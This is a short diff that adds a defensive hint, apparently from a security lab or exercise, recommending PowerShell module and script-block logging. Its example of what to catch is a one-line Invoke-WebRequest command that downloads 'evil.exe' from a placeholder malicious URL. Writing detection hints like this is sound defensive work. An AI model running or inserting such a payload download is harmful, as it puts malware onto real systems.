@@ -1,0 +1,4 @@
+Hint:
+Use PowerShell logging (ModuleLogging, ScriptBlockLogging) to catch scripts like:
+
+Invoke-WebRequest -Uri "http://malicious-url" -OutFile "evil.exe"
